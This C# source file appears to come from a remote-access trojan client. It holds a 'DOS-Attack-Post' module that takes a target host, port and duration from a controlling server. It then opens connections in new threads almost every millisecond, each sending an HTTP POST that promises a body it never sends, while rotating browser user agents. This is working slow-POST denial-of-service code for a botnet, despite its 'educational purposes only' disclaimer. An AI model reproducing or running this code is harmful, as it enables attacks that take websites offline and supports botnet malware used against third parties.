﻿using Client.MessagePack;
using Client.Sockets;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;

//       │ Author     : NYAN CAT
//       │ Name       : DOS-Attack-Post 0.2
//       │ Contact    : https://github.com/NYAN-x-CAT

//       This program is distributed for educational purposes only.

namespace Client.Handle_Packet
{
    public class HandleDos
    {
        private string host;
        private int port;
        private int timeout;
        private readonly string[] userAgents = { " Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"};

        public void DosPost(MsgPack unpack_msgpack)
        {
            host = new Uri(unpack_msgpack.ForcePathObject("Host").AsString).DnsSafeHost;
            port = Convert.ToInt32(unpack_msgpack.ForcePathObject("port").AsString);
            timeout = Convert.ToInt32(unpack_msgpack.ForcePathObject("timeout").AsString) * 60;
            List<Socket> SocketList = new List<Socket>();
            TimeSpan timespan = TimeSpan.FromSeconds(timeout);
            Stopwatch stopwatch = new Stopwatch();
            stopwatch.Start();

            Debug.WriteLine($"Host:{host} Port:{port} Timeout:{timeout}");
            while (!Packet.ctsDos.IsCancellationRequested && timespan > stopwatch.Elapsed && ClientSocket.IsConnected)
            {
                new Thread(() =>
                {
                    try
                    {
                        Socket tcp = new Socket(AddressFamily.InterNetwork,SocketType.Stream,ProtocolType.Tcp);
                        tcp.Connect(host.ToString(), port);
                        SocketList.Add(tcp);
                        string post = $"POST / HTTP/1.1\r\nHost: {host} \r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nUser-Agent: {userAgents[new Random().Next(userAgents.Length)]}\r\nContent-length: 5235\r\n\r\n";
                        byte[] buffer = Encoding.UTF8.GetBytes(post);
                        tcp.Send(buffer, 0, buffer.Length, SocketFlags.None);
                    }
                    catch
                    {
                        //Console.WriteLine("Website may be down!");
                    }
                }).Start();
                Thread.Sleep(1);
            }

            Thread.Sleep(1000);
            foreach (Socket tcp in SocketList.ToList())
            {
                    tcp?.Dispose();
            }

        }
    }
}
